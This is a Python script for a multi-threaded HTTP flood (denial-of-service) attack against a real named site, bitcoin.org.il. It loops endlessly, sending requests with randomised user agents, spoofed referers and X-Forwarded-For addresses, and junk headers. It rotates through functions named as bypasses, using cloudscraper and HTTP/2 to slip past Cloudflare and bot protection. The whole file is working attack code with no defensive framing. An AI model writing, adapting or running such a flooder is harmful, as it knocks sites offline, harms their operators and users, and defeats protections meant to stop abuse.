import threading
import time
import random
from fake_useragent import UserAgent
from cloudscraper import create_scraper
import requests
from contextlib import suppress
import httpx

connections_per_thread = 100
num_threads = 10
url = "https://bitcoin.org.il/"

referers = [
    "http://glz.co.il/",
    "https://www.idf.il/",
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
    "https://www.reddit.com/",
    "https://chat.openai.com/",
    "https://github.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.linkedin.com/",
    "https://www.youtube.com/",
    "https://www.amazon.com/",
    "https://www.wikipedia.org/",
    "https://www.medium.com/",
    "https://www.stackoverflow.com/",
    "https://www.quora.com/",
    "https://www.pinterest.com/",
    "https://www.tumblr.com/",
    "https://www.instagram.com/",
    "https://www.netflix.com/",
    "https://www.microsoft.com/",
    "https://www.apple.com/",
    "https://www.adobe.com/",
    "https://www.cloudflare.com/",
    "https://www.digitalocean.com/",
]

paths = [
    "/",
    "/about",
    "/contact",
    "/services",
    "/blog",
    "/news",
    "/faq",
    "/products"
]

base_headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Pragma": "no-cache",
    "TE": "trailers"
}

cplist = [
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
]

ua = UserAgent()

def random_cipher():
    return random.choice(cplist)

def generate_random_string(min_length, max_length):
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(characters) for _ in range(length))

def cfb_bypass(full_url, headers):
    with suppress(Exception), create_scraper() as session:
        response = session.get(full_url, headers=headers, timeout=5)
        return response

def cfb_uam_bypass(full_url, headers):
    with suppress(Exception):
        session = create_scraper()
        session.get(full_url, headers=headers, timeout=5)
        time.sleep(5.01)
        response = session.get(full_url, headers=headers, timeout=5)
        return response

def bypass(full_url, headers):
    with suppress(Exception), requests.Session() as session:
        response = session.get(full_url, headers=headers, timeout=5)
        return response

def http2_bypass(full_url, headers):
    with suppress(Exception):
        with httpx.Client(http2=True, timeout=5) as client:
            response = client.get(full_url, headers=headers)
            return response

def js_bypass(full_url, headers):
    with suppress(Exception):
        with httpx.Client(http2=True, timeout=5) as client:
            dynamic_headers = {
                ":scheme": "https",
                "user-agent": ua.random,
                "vtl": "s-maxage=9800" if random.random() < 0.5 else "max-age=0",
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                "A-IM": "Feed",
                "origin": f"https://{url.split('://')[1].split('/')[0]}/",
                "navigator.DoNotTrack": "1" if random.random() < 0.5 else "0",
                "navigator.rtt": str(random.randint(100, 500))
            }
            shuffled_headers = {k: dynamic_headers[k] for k in random.sample(list(dynamic_headers.keys()), len(dynamic_headers))}
            headers.update(shuffled_headers)
            headers.update({generate_random_string(5, 10): generate_random_string(5, 10) for _ in range(random.randint(6, 20))})
            
            requests = [
                client.get(full_url, headers=headers),
                client.get(full_url, headers=headers),
                client.get(full_url, headers=headers)
            ]
            for req in requests:
                req.close()

bypass_methods = [cfb_bypass, cfb_uam_bypass, bypass, http2_bypass, js_bypass]

def send_requests():
    while True:
        for _ in range(connections_per_thread):
            try:
                headers = base_headers.copy()
                headers["User-Agent"] = ua.random
                headers["Referer"] = random.choice(referers)
                headers[":authority"] = url.split("://")[1].split("/")[0]
                headers[":method"] = "GET"
                headers[":path"] = random.choice(paths)
                headers[":scheme"] = "https"
                headers.update({generate_random_string(5, 10): generate_random_string(5, 10) for _ in range(random.randint(6, 20))})
                full_url = url + random.choice(paths)
                bypass_method = random.choice(bypass_methods)
                bypass_method(full_url, headers)
            except Exception:
                pass
        time.sleep(random.uniform(0.1, 0.5))

threads = []

for _ in range(num_threads):
    thread = threading.Thread(target=send_requests, daemon=True)
    threads.append(thread)
    thread.start()

try:
    while True:
        time.sleep(0.1)
except KeyboardInterrupt:
    pass
